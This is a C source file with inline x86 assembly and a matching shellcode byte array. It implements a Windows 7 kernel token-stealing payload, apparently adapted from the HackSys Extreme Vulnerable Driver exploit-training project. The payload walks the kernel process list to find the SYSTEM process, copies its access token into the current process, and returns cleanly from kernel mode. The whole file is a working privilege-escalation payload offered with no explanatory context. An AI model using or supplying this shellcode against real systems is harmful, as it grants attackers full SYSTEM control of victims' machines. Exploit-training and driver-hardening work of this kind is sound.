#include <Windows.h>

/*
original payload by Ashfaq Ansari:
https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c#L63
modified to preserve the reference counter
 */
 
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID
 
__declspec(naked) VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov edi, [ecx + TOKEN_OFFSET]        ; Get current process token
        and edx, 0xFFFFFFF8      ; apply the mask on SYSTEM process token, to remove the referece counter
        and edi, 0x7             ; apply the mask on the current process token to preserve the referece counter
        add edx, edi             ; merge AccessToken of SYSTEM with ReferenceCounter of current process
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        ; Kernel Recovery Stub
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        pop ebp                              ; Restore saved EBP
        ret 8                                ; Return cleanly
    }
}

unsigned char kShellcode[] = {
	0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1,
	0xBA, 0x04, 0x00, 0x00, 0x00, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x2D,
	0xB8, 0x00, 0x00, 0x00, 0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, 0x75, 0xED,
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, 0x8B, 0xB9, 0xF8, 0x00, 0x00, 0x00,
	0x83, 0xE2, 0xF8, 0x83, 0xE7, 0x07, 0x01, 0xFA, 0x89, 0x91, 0xF8, 0x00,
	0x00, 0x00, 0x61, 0x31, 0xC0, 0x5D, 0xC2, 0x08, 0x00
};
